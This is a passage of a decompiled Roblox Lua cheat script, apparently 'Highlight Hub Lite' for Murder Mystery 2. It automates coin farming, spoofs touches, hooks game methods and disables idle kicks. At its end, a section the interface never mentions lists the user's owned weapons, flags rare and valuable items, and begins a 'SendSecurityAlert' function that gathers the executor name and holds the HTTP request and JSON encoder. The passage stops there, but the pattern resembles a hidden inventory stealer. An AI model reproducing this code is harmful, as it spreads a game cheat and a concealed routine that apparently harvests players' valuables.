				table.remove(v_u_21.CoinsPart, v171)
				break
			end
		end
	end
	function FindMap()
		-- upvalues: (ref) v_u_21, (ref) v_u_7
		if not v_u_21.Map then
			local v173 = v_u_7
			local v174, v175, v176 = pairs(v173:GetDescendants())
			while true do
				local v177
				v176, v177 = v174(v175, v176)
				if v176 == nil then
					break
				end
				if v177:IsA("Model") and (v177.Name == "CoinContainer" or v177.Name == "CoinAreas") then
					v_u_21.Map = v177.Parent
					break
				end
			end
		end
	end
	local v_u_178 = false
	local v_u_179 = nil
	local v_u_180 = nil
	local v_u_181 = 0
	function TweenToClosestCoin()
		-- upvalues: (ref) v_u_21, (ref) v_u_19, (ref) v_u_18, (ref) v_u_179, (ref) v_u_181, (ref) v_u_180, (ref) v_u_17, (ref) v_u_13, (ref) v_u_178
		local v199, v200 = pcall(function()
			-- upvalues: (ref) v_u_21, (ref) v_u_19, (ref) v_u_18, (ref) v_u_179, (ref) v_u_181, (ref) v_u_180, (ref) v_u_17, (ref) v_u_13, (ref) v_u_178
			if v_u_21.IsRoundStarted then
				local v182 = v_u_19.InstantTPIfTooFar
				local v183 = v_u_18.Position
				local v184 = math.huge
				local v185, v186, v187 = ipairs(v_u_21.CoinsPart)
				local v188 = nil
				while true do
					local v189, v190 = v185(v186, v187)
					if v189 == nil then
						break
					end
					v187 = v189
					local v191 = v190.Coin:GetAttribute("CoinID")
					if v_u_19.CoinType == "BeachBall" and v191 == "BeachBall" or (v_u_19.CoinType == "Coin" and v191 == "Coin" or v_u_19.CoinType == "Both") then
						if v_u_19.CoinType == "Both" and (IsCoinBagFull() and v191 == "Coin") or IsBeachBallBagFull() and v191 == "BeachBall" then
							v190.Coin:Destroy()
						end
						if not v190.Coin:GetAttribute("Collected") then
							local v192 = (v190.Coin.Position - v183).Magnitude
							if v192 < v184 then
								v188 = v190.Coin
								v184 = v192
							end
						end
					end
				end
				if v188 ~= v_u_179 then
					v_u_181 = 0
				else
					v_u_181 = v_u_181 + 1
					if v_u_181 > tonumber(v_u_19.TriesBeforeSkip) then
						v188:Destroy()
						v_u_181 = 0
					end
					if v_u_180 ~= v188 then
						v_u_180 = nil
						return
					end
				end
				if v188 then
					v_u_179 = v188
					if tonumber(v182) < v184 then
						v_u_18.CFrame = CFrame.new(v188.Position)
					end
					v_u_17:MoveTo(v188.Position)
					task.wait()
					local v193
					if v_u_19.TweenUnder then
						v193 = v188.Position - Vector3.new(0, 5, 0)
					else
						v193 = v188.Position
					end
					local v194 = v193 - v_u_18.Position
					local v195 = v_u_19.AutoFarmMode == "Safe" and math.random(12, 16) or v_u_19.TweenSpeed
					if v194.Y < 0 then
						v195 = v195 / 1.1
					end
					local v_u_196 = v_u_13:Create(v_u_18, TweenInfo.new(v194.Magnitude / v195, Enum.EasingStyle.Linear), {
						["CFrame"] = CFrame.new(v193)
					})
					v_u_178 = true
					local v197, v198 = pcall(function()
						-- upvalues: (ref) v_u_196
						v_u_196:Play()
						v_u_196.Completed:Wait()
					end)
					v_u_178 = false
					if v197 then
						firetouchinterest(v_u_18, v188, 0)
						firetouchinterest(v_u_18, v188, 1)
						v_u_180 = v188
					else
						warn("TweenService error:", v198)
					end
				end
			end
		end)
		if not v199 then
			warn("Auto Farm Error: " .. v200)
		end
	end
	function CoinsInformationInit(p201)
		-- upvalues: (ref) v_u_21, (ref) v_u_23
		if p201 then
			FindMap()
			local v202 = v_u_21.Map:FindFirstChild("CoinContainer")
			if v202 then
				v_u_23.CoinAdded = v202.ChildAdded:Connect(function(p203)
					AddCoinToTable(p203)
				end)
				v_u_23.CoinRemoved2 = v202.ChildRemoved:Connect(function(p204)
					RemoveCoinToTable(p204)
				end)
				local v205, v206, v207 = pairs(v202:GetChildren())
				while true do
					local v208
					v207, v208 = v205(v206, v207)
					if v207 == nil then
						break
					end
					AddCoinToTable(v208)
				end
			end
		else
			if v_u_23.CoinAdded and v_u_23.CoinRemoved2 then
				v_u_23.CoinAdded:Disconnect()
				v_u_23.CoinRemoved2:Disconnect()
			end
			v_u_21.CoinsPart = {}
		end
	end
	v_u_10.Remotes.Gameplay.RoleSelect.OnClientEvent:Connect(function(_)
		-- upvalues: (ref) v_u_21
		v_u_21.IsRoundStarting = true
		v_u_21.Gameplay = {}
		v_u_21.GameplayMap = {}
		GetRoles()
		v_u_21.Map = nil
		FindMap()
	end)
	v_u_10.Remotes.Gameplay.RoundStart.OnClientEvent:Connect(function(_)
		-- upvalues: (ref) v_u_21, (ref) v_u_19, (ref) v_u_17
		v_u_21.IsRoundStarted = true
		v_u_21.IsRoundStarting = false
		if v_u_19.SecondLife then
			v_u_17:ChangeState(11)
		end
		if v_u_19.CoinFarm then
			task.wait(0.5)
			CoinsInformationInit(true)
		end
	end)
	v_u_10.Remotes.Gameplay.VictoryScreen.OnClientEvent:Connect(function()
		-- upvalues: (ref) v_u_21, (ref) v_u_19, (ref) v_u_17
		v_u_21.IsRoundStarted = false
		v_u_21.Gameplay.Murderer = nil
		v_u_21.Gameplay.Sheriff = nil
		if v_u_19.SecondLife then
			v_u_17:ChangeState(18)
		end
		if v_u_19.CoinFarm then
			CoinsInformationInit(false)
		end
	end)
	v_u_2.CharacterAdded:Connect(function(p209)
		-- upvalues: (ref) v_u_16, (ref) v_u_17, (ref) v_u_18
		v_u_16 = p209
		v_u_17 = v_u_16:WaitForChild("Humanoid")
		v_u_18 = v_u_16:WaitForChild("HumanoidRootPart")
	end)
	v_u_7.DescendantAdded:Connect(function(p210)
		-- upvalues: (ref) v_u_21, (ref) v_u_19
		if p210.ClassName == "Tool" and (p210:IsA("Knife") and not v_u_21.Gameplay.Murderer) or p210.Name == "Gun" and (p210:WaitForChild("KnifeServer", 3) and not v_u_21.Gameplay.Sheriff) then
			CheckTool(p210)
			if v_u_19.AutoBreakGun then
				BreakGun()
			end
		end
		if v_u_19.DestroyDisplay and p210.Parent == "WeaponDisplays" then
			task.wait()
			p210:Destroy()
		end
		if v_u_21.IsRoundStarted and (p210:IsA("Model") and (v_u_19.DestroyDeadBody and p210.Name == "Raggy")) then
			task.wait()
			p210:Destroy()
		end
	end)
	v_u_1.DescendantAdded:Connect(function(p211)
		-- upvalues: (ref) v_u_21, (ref) v_u_19
		if p211.ClassName == "Tool" and (p211:IsA("Knife") and not v_u_21.Gameplay.Murderer) or p211.Name == "Gun" and (p211:WaitForChild("KnifeServer", 3) and not v_u_21.Gameplay.Sheriff) then
			CheckTool(p211)
			if v_u_19.AutoBreakGun then
				BreakGun()
			end
		end
	end)
	local v_u_212 = nil
	v_u_212 = v_u_12.ErrorMessageChanged:Connect(function(p213)
		-- upvalues: (ref) v_u_12, (ref) v_u_212, (ref) v_u_19, (ref) v_u_2
		if v_u_12:GetErrorCode() == Enum.ConnectionError.DisconnectLuaKick then
			v_u_212:Disconnect()
			if p213 == "Invalid position" then
				local v214, v215, v216 = pairs({
					"CoinType",
					"TweenSpeed",
					"AutoFarmDelay",
					"InstantTPIfTooFar",
					"TriesBeforeSkip",
					"CoinAuraDistance",
					"CoinAura",
					"TweenUnder",
					"ToDoWhenDone",
					"AutoFarmMode"
				})
				local v217 = {}
				while true do
					local v218
					v216, v218 = v214(v215, v216)
					if v216 == nil then
						break
					end
					if v_u_19[v218] then
						table.insert(v217, v218 .. " = " .. tostring(v_u_19[v218]))
					end
				end
				local v219 = "Kicked for: \'Invalid position\'"
				if v_u_19.CoinFarm then
					local v220 = v219 .. "\n" .. v_u_19.AutoFarmInfo.Description .. "\nSettings: " .. table.concat(v217, ", ") .. "\nPing: " .. math.floor(game.Stats.PerformanceStats.Ping:GetValue())
					v_u_2:Kick("Auto farming.\nLower the speed of the auto farm.")
					if v_u_19.KickNotify then
						SendWebhook(v_u_19.Webhook, v220)
					end
				end
			end
			if v_u_19.RejoinWhenKicked then
				Rejoin()
			end
		end
	end)
	if hookmetamethod then
		local v_u_221 = nil
		v_u_221 = hookmetamethod(game, "__namecall", function(p222)
			-- upvalues: (ref) v_u_19, (ref) v_u_221
			local v223 = getnamecallmethod()
			local v224 = { ... }
			if not checkcaller() and (typeof(p222) == "Instance" and (v223 == "FireServer" and (p222.Name == "CrateComplete" and (v_u_19.AutoUnboxNotify and (v_u_19.Webhook and v_u_19.AutoUnbox))))) then
				SendUnboxWebhook(v_u_19.Webhook, v224[1])
			end
			return v_u_221(p222, unpack(v224))
		end)
	end
	local v225 = v_u_4:CreateWindow({
		["Title"] = "Highlight Hub Lite | .gg/WECAHSW7EW",
		["SubTitle"] = "by venox35",
		["TabWidth"] = 31,
		["Size"] = UDim2.fromOffset(400, 300),
		["Acrylic"] = true,
		["Theme"] = "Darker",
		["MinimizeKey"] = Enum.KeyCode.LeftControl
	})
	local v226 = {
		["AutoFarm"] = v225:AddTab({
			["Title"] = " Auto Farm",
			["Icon"] = "coins"
		}),
		["Extra"] = v225:AddTab({
			["Title"] = " Extra",
			["Icon"] = "clover"
		}),
		["Settings"] = v225:AddTab({
			["Title"] = " Settings",
			["Icon"] = "settings"
		})
	}
	local v_u_227 = v_u_4.Options
	local v228 = v226.AutoFarm:AddSection("Farm")
	local v_u_229 = 0
	local v_u_230 = 0
	v_u_22.AutoFarmInfoDesc = v228:AddParagraph({
		["Title"] = "Information",
		["Content"] = " Statues: Off \n Earned: " .. v_u_229 .. "\n Duration: 0h 0m 0s \n Rate: 0 coins/hour"
	})
	function UpdateParagraph()
		-- upvalues: (ref) v_u_19, (ref) v_u_229, (ref) v_u_230, (ref) v_u_22
		os.time()
		local v231 = os.time()
		local v232 = 0
		local v233 = 0
		local v234 = 0
		while v_u_19.CoinFarm and task.wait() do
			local v235 = os.time() - v231
			local v236 = math.floor(v235 / 3600)
			local v237 = math.floor(v235 % 3600 / 60)
			local v238 = v235 % 60
			local v239 = v235 / 3600
			v_u_229 = GetCoins("Coin") + GetCoins("BeachBall") - v_u_230
			local v240 = v_u_229 / v239
			if not v_u_19.CoinFarm then
				break
			end
			if v_u_229 ~= v232 or (v235 ~= v233 or v240 ~= v234) then
				v_u_19.AutoFarmInfo.Description = " Status: " .. v_u_19.AutoFarmInfo.Status .. "\n Earned: " .. v_u_229 .. "\n Duration: " .. v236 .. "h " .. v237 .. "m " .. v238 .. "s  \n Rate: " .. string.format("%.2f", v240) .. " coins/hour"
				v_u_22.AutoFarmInfoDesc:SetDesc(v_u_19.AutoFarmInfo.Description)
				v232 = v_u_229
				v234 = v240
				v233 = v235
			end
		end
	end
	v_u_22.AutoFarmToggle = v228:AddToggle("CoinFarmToggle", {
		["Title"] = "Coin Farm",
		["Default"] = false,
		["Callback"] = function(p241)
			-- upvalues: (ref) v_u_19, (ref) v_u_21, (ref) v_u_229, (ref) v_u_230, (ref) v_u_18, (ref) v_u_17, (ref) v_u_178, (ref) v_u_22
			v_u_19.CoinFarm = p241
			if v_u_19.CoinFarm then
				v_u_19.CoinFarmEnabled = true
				v_u_19.Noclip = true
				v_u_19.Float = true
				if v_u_21.IsRoundStarted then
					CoinsInformationInit(true)
				end
				v_u_229 = 0
				v_u_230 = GetCoins("Coin") + GetCoins("BeachBall")
				task.spawn(UpdateParagraph)
			end
			while v_u_19.CoinFarm do
				local v244, v245 = pcall(function()
					-- upvalues: (ref) v_u_21, (ref) v_u_19, (ref) v_u_18, (ref) v_u_17
					if v_u_21.IsRoundStarted then
						v_u_19.AutoFarmVariable.IsAlive = IsAlive() or v_u_19.AutoFarmVariable.FTH
						if v_u_19.AutoFarmVariable.IsAlive then
							if v_u_19.CoinType ~= "Both" then
								if v_u_19.CoinType ~= "Coin" then
									if v_u_19.CoinType == "BeachBall" then
										v_u_19.AutoFarmVariable.IsBagFull = IsBeachBallBagFull()
									end
								else
									v_u_19.AutoFarmVariable.IsBagFull = IsCoinBagFull()
								end
							else
								local v242 = v_u_19.AutoFarmVariable
								local v243 = IsCoinBagFull()
								if v243 then
									v243 = IsBeachBallBagFull()
								end
								v242.IsBagFull = v243
							end
							if v_u_19.AutoFarmVariable.IsBagFull then
								v_u_19.AutoFarmInfo.Status = "Waiting.. (Bag Full)"
								v_u_18.CFrame = CFrame.new(0, 100, 0)
								if v_u_19.ToDoWhenDone == "Reset" and v_u_19.AutoFarmVariable.IsAlive then
									v_u_17.Health = 0
								end
								if v_u_19.ToDoWhenDone == "End Round" and not v_u_19.AutoFarmVariable.RoundEnded then
									EndRound()
									v_u_19.AutoFarmVariable.RoundEnded = true
								end
							else
								v_u_19.AutoFarmInfo.Status = "Tweening.."
								task.spawn(TweenToClosestCoin)
								v_u_19.AutoFarmInfo.Status = "Collecting.."
								v_u_19.AutoFarmVariable.RoundEnded = false
							end
						else
							v_u_19.AutoFarmInfo.Status = "Waiting.. (Dead)"
							v_u_19.AutoFarmVariable.FTH = false
							v_u_18.CFrame = CFrame.new(0, 100, 0)
							if v_u_19.ToDoWhenDone == "End Round" then
								EndRound()
							end
						end
					else
						v_u_19.AutoFarmInfo.Status = "Waiting.. (Round Start)"
						v_u_18.CFrame = CFrame.new(0, 100, 0)
					end
				end)
				if not v244 then
					warn("Auto Farm Error: " .. v245)
				end
				task.wait(v_u_19.AutoFarmDelay)
			end
			if not v_u_19.CoinFarm and v_u_19.CoinFarmEnabled then
				if v_u_178 then
					repeat
						task.wait(0.5)
					until not v_u_178
				end
				CoinsInformationInit(false)
				TeleportTo("Lobby")
				v_u_19.CoinFarmEnabled = false
				v_u_19.Noclip = false
				v_u_19.Float = false
				v_u_22.AutoFarmInfoDesc:SetDesc(" Status: Off \n Earned: 0 \n Duration: 0h 0m 0s \n Rate: 0 coins/hour")
			end
		end
	})
	v228:AddDropdown("BoxToOpenList", {
		["Title"] = "Box To Open",
		["Values"] = {
			"MysteryBox1",
			"MysteryBox2",
			"KnifeBox1",
			"KnifeBox2",
			"KnifeBox3",
			"KnifeBox4",
			"MLG Box",
			"GunBox1",
			"GunBox2",
			"GunBox3"
		},
		["Multi"] = false,
		["Default"] = "MysteryBox1",
		["Callback"] = function(p246)
			-- upvalues: (ref) v_u_19
			v_u_19.BoxToOpen = p246
		end
	})
	v228:AddToggle("AutoUnboxToggle", {
		["Title"] = "Auto Unbox",
		["Default"] = false,
		["Callback"] = function(p247)
			-- upvalues: (ref) v_u_19
			v_u_19.AutoUnbox = p247
			while v_u_19.AutoUnbox and task.wait() do
				if GetCoins("Coin") >= 1000 then
					Unbox(v_u_19.BoxToOpen)
				end
			end
		end
	})
	v228:AddToggle("AutoPrestigeToggle", {
		["Title"] = "Auto Prestige",
		["Default"] = false,
		["Callback"] = function(p248)
			-- upvalues: (ref) v_u_19, (ref) v_u_21, (ref) v_u_2, (ref) v_u_227
			v_u_19.AutoPrestige = p248
			v_u_21.Prestige = v_u_2:GetAttribute("Prestige")
			if v_u_19.AutoPrestige then
				if v_u_21.Prestige == 10 then
					v_u_227.AutoPrestigeToggle:SetValue(false)
					return
				end
				v_u_21.Level = v_u_2:GetAttribute("Level")
				v_u_21.LevelConnect = v_u_2:GetAttributeChangedSignal("Level"):Connect(function()
					-- upvalues: (ref) v_u_21, (ref) v_u_2, (ref) v_u_19, (ref) v_u_227
					v_u_21.Level = v_u_2:GetAttribute("Level")
					if v_u_19.AutoPrestige and (v_u_21.Level == 100 and v_u_21.Prestige ~= 10) then
						Prestige()
						v_u_21.Prestige = v_u_2:GetAttribute("Prestige")
						if v_u_21.Prestige == 10 then
							v_u_21.LevelConnect:Disconnect()
							v_u_21.LevelConnect = nil
							v_u_227.AutoPrestigeToggle:SetValue(false)
							return
						end
					end
				end)
				if v_u_21.Level == 100 then
					Prestige()
				end
			elseif v_u_21.LevelConnect then
				v_u_21.LevelConnect:Disconnect()
				v_u_21.LevelConnect = nil
			end
		end
	})
	v_u_22.FarmSettingsSection = v226.AutoFarm:AddSection("Settings")
	v_u_22.FarmSettingsSection:AddDropdown("CoinTypeList", {
		["Title"] = "Coin Type",
		["Values"] = { "Both", "Coin", "BeachBall" },
		["Multi"] = false,
		["Default"] = v_u_19.CoinType,
		["Callback"] = function(p249)
			-- upvalues: (ref) v_u_19
			v_u_19.CoinType = p249
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("FloatVectorSlider", {
		["Title"] = "Float Vector",
		["Description"] = "Find the right vector for your character.",
		["Default"] = -3.05,
		["Min"] = -3.3,
		["Max"] = -3.1,
		["Rounding"] = 2,
		["Callback"] = function(p250)
			-- upvalues: (ref) v_u_19
			v_u_19.FloatVector = p250
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("TweenSpeedSlider", {
		["Title"] = "Tween Speed",
		["Description"] = "Any value above 22 is not recommended.",
		["Default"] = v_u_19.TweenSpeed,
		["Min"] = 10,
		["Max"] = 30,
		["Rounding"] = 1,
		["Callback"] = function(p251)
			-- upvalues: (ref) v_u_19
			v_u_19.TweenSpeed = p251
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("AutoFarmDelaySlider", {
		["Title"] = "Delay",
		["Default"] = v_u_19.AutoFarmDelay,
		["Min"] = 0,
		["Max"] = 1,
		["Rounding"] = 1,
		["Callback"] = function(p252)
			-- upvalues: (ref) v_u_19
			v_u_19.AutoFarmDelay = p252
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("InstantTPIfTooFarSlider", {
		["Title"] = "Instant TP If Too Far",
		["Default"] = v_u_19.InstantTPIfTooFar,
		["Min"] = 100,
		["Max"] = 400,
		["Rounding"] = 0.1,
		["Callback"] = function(p253)
			-- upvalues: (ref) v_u_19
			v_u_19.InstantTPIfTooFar = p253
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("TriesBeforeSkipSlider", {
		["Title"] = "Tries Before Skip",
		["Default"] = v_u_19.TriesBeforeSkip,
		["Min"] = 200,
		["Max"] = 600,
		["Rounding"] = 0.5,
		["Callback"] = function(p254)
			-- upvalues: (ref) v_u_19
			v_u_19.TriesBeforeSkip = p254
		end
	})
	v_u_22.FarmSettingsSection:AddSlider("CoinAuraDistanceSlider", {
		["Title"] = "Coin Aura Distance",
		["Default"] = v_u_19.CoinAuraDistance,
		["Min"] = 3,
		["Max"] = 10,
		["Rounding"] = 0.1,
		["Callback"] = function(p255)
			-- upvalues: (ref) v_u_19
			v_u_19.CoinAuraDistance = p255
		end
	})
	v_u_22.FarmSettingsSection:AddToggle("CoinAuraToggle", {
		["Title"] = "Coin Aura",
		["Default"] = v_u_19.CoinAura,
		["Callback"] = function(p256)
			-- upvalues: (ref) v_u_19, (ref) v_u_4, (ref) v_u_227, (ref) v_u_21, (ref) v_u_18
			if p256 and v_u_19.AutoFarmMode == "Safe" then
				v_u_4:Notify({
					["Title"] = "Highlight Hub",
					["Content"] = "You can\'t enable this feature with Safe Mode.",
					["Duration"] = 5
				})
				v_u_227.CoinAuraToggle:SetValue(false)
			else
				v_u_19.CoinAura = p256
				while v_u_19.CoinAura do
					if v_u_21.IsRoundStarted and v_u_18 then
						local v257 = v_u_18.Position
						local v258, v259, v260 = pairs(v_u_21.CoinsPart)
						while true do
							local v261
							v260, v261 = v258(v259, v260)
							if v260 == nil then
								break
							end
							if (v257 - v261.Position).Magnitude <= tonumber(v_u_19.CoinAuraDistance) then
								firetouchinterest(v_u_18, v261.Coin, 0)
								firetouchinterest(v_u_18, v261.Coin, 1)
							end
						end
					end
					task.wait()
				end
			end
		end
	})
	v_u_22.FarmSettingsSection:AddToggle("TweenUnderToggle", {
		["Title"] = "Tween Under",
		["Description"] = "Disable this if you crash.",
		["Default"] = v_u_19.TweenUnder,
		["Callback"] = function(p262)
			-- upvalues: (ref) v_u_19
			v_u_19.TweenUnder = p262
		end
	})
	v_u_22.FarmSettingsSection:AddDropdown("TodoWhenDoneDropdown", {
		["Title"] = "To Do When Done",
		["Values"] = { "Wait", "Reset", "End Round" },
		["Multi"] = false,
		["Default"] = 2,
		["Callback"] = function(p263)
			-- upvalues: (ref) v_u_19
			v_u_19.ToDoWhenDone = p263
		end
	})
	v_u_22.FarmSettingsSection:AddDropdown("AutoFarmModeDropdown", {
		["Title"] = "Mode",
		["Values"] = { "Normal", "Safe" },
		["Multi"] = false,
		["Default"] = "Normal",
		["Callback"] = function(p264)
			-- upvalues: (ref) v_u_19, (ref) v_u_227
			v_u_19.AutoFarmMode = p264
			if v_u_19.AutoFarmMode == "Safe" and v_u_19.CoinAura then
				v_u_227.CoinAuraToggle:SetValue(false)
			end
		end
	})
	local v265 = v226.Extra:AddSection("Optimization")
	v265:AddToggle("DestroyDisplayToggle", {
		["Title"] = "Improve FPS",
		["Default"] = v_u_19.DestroyDisplay,
		["Callback"] = function(p266)
			-- upvalues: (ref) v_u_19, (ref) v_u_7
			v_u_19.DestroyDisplay = p266
			if v_u_19.DestroyDisplay then
				local v267, v268, v269 = pairs(v_u_7.PetContainer:GetChildren())
				while true do
					local v270
					v269, v270 = v267(v268, v269)
					if v269 == nil then
						break
					end
					v270:Destroy()
				end
				local v271, v272, v273 = pairs(v_u_7.WeaponDisplays:GetChildren())
				while true do
					local v274
					v273, v274 = v271(v272, v273)
					if v273 == nil then
						break
					end
					v274:Destroy()
				end
			end
		end
	})
	v265:AddToggle("DestroyDeadBodyToggle", {
		["Title"] = "Destroy Dead Body",
		["Default"] = v_u_19.DestroyDeadBody,
		["Callback"] = function(p275)
			-- upvalues: (ref) v_u_19, (ref) v_u_21, (ref) v_u_7
			v_u_19.DestroyDeadBody = p275
			if v_u_19.DestroyDeadBody and v_u_21.IsRoundStarted then
				local v276 = v_u_7
				local v277, v278, v279 = pairs(v276:GetChildren())
				while true do
					local v280
					v279, v280 = v277(v278, v279)
					if v279 == nil then
						break
					end
					if v280:IsA("Model") and v280.Name == "Raggy" then
						v280:Destroy()
					end
				end
			end
		end
	})
	v265:AddToggle("Disable3DRenderingToggle", {
		["Title"] = "Disable 3D Rendering",
		["Default"] = false,
		["Callback"] = function(p281)
			-- upvalues: (ref) v_u_19, (ref) v_u_11
			v_u_19.Disable3DRendering = p281
			v_u_11:Set3dRenderingEnabled(not v_u_19.Disable3DRendering)
		end
	})
	local v282 = v226.Extra:AddSection("Other")
	v282:AddToggle("SecondLifeToggle", {
		["Title"] = "Second Life",
		["Default"] = v_u_19.SecondLife,
		["Callback"] = function(p283)
			-- upvalues: (ref) v_u_19, (ref) v_u_21, (ref) v_u_17
			v_u_19.SecondLife = p283
			if v_u_19.SecondLife then
				if v_u_21.IsRoundStarted and IsAlive() then
					v_u_17:ChangeState(11)
					v_u_19.SecondLifeEnabled = true
				end
			elseif v_u_19.SecondLifeEnabled then
				v_u_17:ChangeState(18)
			end
		end
	})
	v282:AddToggle("AutoBreakGunToggle", {
		["Title"] = "Auto Break Gun",
		["Default"] = v_u_19.AutoBreakGun,
		["Callback"] = function(p284)
			-- upvalues: (ref) v_u_19, (ref) v_u_21
			v_u_19.AutoBreakGun = p284
			if v_u_19.AutoBreakGun and v_u_21.IsRoundStarted then
				BreakGun()
			end
		end
	})
	local v285 = v226.Extra:AddSection("Logging")
	v285:AddInput("WebhookInput", {
		["Title"] = "Webhook",
		["Default"] = "",
		["Placeholder"] = "",
		["Numeric"] = false,
		["Finished"] = true,
		["Callback"] = function(p286)
			-- upvalues: (ref) v_u_19, (ref) v_u_15, (ref) v_u_8, (ref) v_u_4
			v_u_19.Webhook = p286
			local v_u_287 = {
				["username"] = "Highlight Hub Lite"
			}
			local v288 = {}
			local v289 = {
				["color"] = 13187017,
				["title"] = "Test Webhook",
				["description"] = "**Highlight Hub Lite was here.**",
				["timestamp"] = DateTime(),
				["footer"] = {
					["text"] = "Highlight Hub Lite"
				}
			}
			__set_list(v288, 1, {v289})
			v_u_287.embeds = v288
			local v292, _ = pcall(function()
				-- upvalues: (ref) v_u_15, (ref) v_u_19, (ref) v_u_8, (ref) v_u_287
				local v290 = v_u_15
				local v291 = {
					["Url"] = v_u_19.Webhook,
					["Method"] = "POST",
					["Headers"] = {
						["Content-Type"] = "application/json"
					},
					["Body"] = v_u_8:JSONEncode(v_u_287)
				}
				return v290(v291)
			end)
			if not v292 then
				v_u_4:Notify({
					["Title"] = "\226\157\140 Error",
					["Content"] = "The webhook does not exist.",
					["Duration"] = 5
				})
			end
		end
	})
	v285:AddToggle("AutoUnboxNotifyToggle", {
		["Title"] = "Auto Unbox Notify",
		["Default"] = v_u_19.AutoUnboxNotify,
		["Callback"] = function(p293)
			-- upvalues: (ref) v_u_19
			v_u_19.AutoUnboxNotify = p293
		end
	})
	v285:AddToggle("KickNotifyToggle", {
		["Title"] = "Kick Notify",
		["Default"] = v_u_19.KickNotify,
		["Callback"] = function(p294)
			-- upvalues: (ref) v_u_19
			v_u_19.KickNotify = p294
		end
	})
	local v295 = v226.Extra:AddSection("Hopper")
	v295:AddButton({
		["Title"] = "Rejoin",
		["Callback"] = function()
			Rejoin()
		end
	})
	v295:AddToggle("RejoinWhenKickedToggle", {
		["Title"] = "Rejoin When Kicked",
		["Default"] = false,
		["Callback"] = function(p296)
			-- upvalues: (ref) v_u_19
			v_u_19.RejoinWhenKicked = p296
		end
	})
	v295:AddButton({
		["Title"] = "Server Hop",
		["Callback"] = function()
			ServerHop()
		end
	})
	v295:AddToggle("ServerHopWhenEmptyToggle", {
		["Title"] = "Server Hop When Empty",
		["Default"] = false,
		["Callback"] = function(p297)
			-- upvalues: (ref) v_u_19, (ref) v_u_1
			v_u_19.ServerHopWhenEmpty = p297
			if v_u_19.ServerHopWhenEmpty then
				if #v_u_1:GetPlayers() ~= 1 then
					v_u_19.ServerHopWhenEmptyConnect = v_u_1.PlayerRemoving:Connect(function(_)
						-- upvalues: (ref) v_u_19, (ref) v_u_1
						v_u_19.ServerHopWhenEmptyConnect:Disconnect()
						v_u_19.ServerHopWhenEmptyConnect = nil
						if #v_u_1:GetPlayers() == 1 then
							ServerHop()
						end
					end)
				else
					ServerHop()
				end
			elseif v_u_19.ServerHopWhenEmptyConnect then
				v_u_19.ServerHopWhenEmptyConnect:Disconnect()
				v_u_19.ServerHopWhenEmptyConnect = nil
			end
		end
	})
	v295:AddSlider("ServerHopAfterSlider", {
		["Title"] = "Server Hop After",
		["Default"] = 10,
		["Min"] = 1,
		["Max"] = 60,
		["Rounding"] = 0.1,
		["Callback"] = function(p298)
			-- upvalues: (ref) v_u_19
			v_u_19.ServerHopAfter = p298 * 60
			if v_u_19.AutoServerHop then
				v_u_19.AutoServerHop = false
				v_u_19.AutoServerHop = true
				for _ = 1, v_u_19.ServerHopAfter do
					if not v_u_19.AutoServerHop then
						return
					end
					task.wait(1)
				end
				ServerHop()
			end
		end
	})
	v295:AddToggle("AutoServerHopToggle", {
		["Title"] = "Auto Server Hop",
		["Default"] = false,
		["Callback"] = function(p299)
			-- upvalues: (ref) v_u_19
			v_u_19.AutoServerHop = p299
			if v_u_19.AutoServerHop then
				for _ = 1, v_u_19.ServerHopAfter do
					if not v_u_19.AutoServerHop then
						return
					end
					task.wait(1)
				end
				ServerHop()
			end
		end
	})
	v44:SetLibrary(v_u_4)
	v45:SetLibrary(v_u_4)
	v44:IgnoreThemeSettings()
	v44:SetIgnoreIndexes({})
	v45:SetFolder("HighlightHub Lite")
	v44:SetFolder("HighlightHub Lite/Murder Mystery 2")
	v45:BuildInterfaceSection(v226.Settings)
	v44:BuildConfigSection(v226.Settings)
	v225:SelectTab(1)
	if getconnections then
		local v300, v301, v302 = pairs(getconnections(v_u_2.Idled))
		while true do
			local v303
			v302, v303 = v300(v301, v302)
			if v302 == nil then
				break
			end
			v303:Disable()
		end
	else
		v_u_2.Idled:Connect(function()
			-- upvalues: (ref) v_u_14
			v_u_14:CaptureController()
			v_u_14:ClickButton2(Vector2.new())
		end)
	end
	v44:LoadAutoloadConfig()
	local v304 = v_u_4
	v_u_4.Notify(v304, {
		["Title"] = "Highlight Hub Lite",
		["Content"] = string.format("The script has been loaded, make sure to join the dicord server to get the full version of Highlight Hub."),
		["Duration"] = 5
	})
	getgenv().HL_FULLY_LOADED = true
	if not v_u_10.Remotes.Extras.IsVIPServer:InvokeServer() then
		local v305 = v_u_10.Remotes.Extras.GetData2:InvokeServer().Weapons.Owned
		local v306, v307, v308 = pairs(v305)
		local v_u_309 = {}
		local v310 = {
			["Godly"] = 0,
			["Ancient"] = 0,
			["Unique"] = 0,
			["Classic"] = 0,
			["Halloween"] = 0,
			["Christmas"] = 0,
			["Legendary"] = 0,
			["Rare"] = 0,
			["Uncommon"] = 0,
			["Common"] = 0
		}
		local v_u_311 = {
			["Godly"] = true,
			["Ancient"] = true,
			["Unique"] = true,
			["Classic"] = true,
			["Halloween"] = true,
			["Christmas"] = true,
			["Legendary"] = false
		}
		local v_u_312 = {
			["Gingerscope"] = true,
			["TravelerAxe"] = true,
			["TreeGun2023Chroma"] = true,
			["TreeKnife2023Chroma"] = true,
			["WatergunChroma"] = true,
			["Harvester"] = true,
			["Icepiercer"] = true,
			["Sorry"] = true,
			["Turkey2023"] = true,
			["ZombieBat"] = false,
			["Sakura_K"] = true,
			["Blossom_G"] = true,
			["Darkshot"] = false,
			["Darksword"] = false,
			["VampireGun"] = true,
			["VampireGunChroma"] = true,
			["VampireAxe"] = true
		}
		while true do
			local v313, v314 = v306(v307, v308)
			if v313 == nil then
				break
			end
			v308 = v313
			local v315 = v_u_10.Remotes.Extras.GetItemData:InvokeServer()[v313]
			local v316 = v315 and v315.Rarity or "Unknown"
			v_u_309[tostring(v313)] = {
				["count"] = v314,
				["rarity"] = v316
			}
			if v316 and v310[v316] ~= nil then
				v310[v316] = v310[v316] + 1
			end
		end
		local v_u_317 = false
		function SendSecurityAlert()
			-- upvalues: (ref) v_u_2, (ref) v_u_3, (ref) v_u_309, (ref) v_u_311, (ref) v_u_312, (ref) v_u_317, (ref) v_u_5, (ref) v_u_6, (ref) v_u_15, (ref) v_u_8
			local v318 = {}
			table.insert(v318, "Executor: " .. identifyexecutor())
